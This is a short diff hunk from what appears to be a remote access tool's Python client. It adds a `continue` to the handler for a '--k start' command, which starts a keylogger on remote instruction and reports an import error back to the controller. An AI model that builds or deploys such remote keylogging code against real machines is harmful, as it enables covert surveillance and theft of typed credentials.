@@ -430,7 +430,7 @@ class Client(object):
             if data[0] == '--k start':
                 if not _pynput:
                     self.send(b'Keylogger is disabled due to import error.')
-
+                    continue
                 if not KeyListener.running:
                     KeyListener.start()
                     logging.info('Started Keylogger')
